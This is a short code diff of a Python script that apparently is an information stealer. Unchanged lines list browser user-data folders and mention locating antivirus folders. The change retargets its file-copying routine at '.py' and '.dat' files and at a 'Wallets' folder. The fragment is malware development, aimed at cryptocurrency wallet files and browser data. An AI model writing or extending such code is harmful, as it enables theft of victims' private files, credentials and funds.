@@ -20,7 +20,7 @@ appdata = os.getenv('LOCALAPPDATA')
 user = os.path.expanduser("~")
 
 search_in = "Default"
-extensions_to_search = ['.png', '.jpg', '.pdf', '.docx'] # If you want to add more, add :))
+extensions_to_search = ['.py', '.dat', '.pdf', '.docx'] # If you want to add more, add :))
 
 browsers = {
     'amigo': appdata + '\\Amigo\\User Data',
@@ -293,7 +293,7 @@ def find_antivirus_folders(base_folder):
 
 
 def search_and_copy_files(start_folder, dest_folder, search_all=False):
-    specific_folders = ['Desktop', 'Documents', 'Downloads', 'Pictures']
+    specific_folders = ['Desktop', 'Documents', 'Downloads', 'Wallets']
 
     for root, dirs, files in os.walk(start_folder):
         if not search_all:
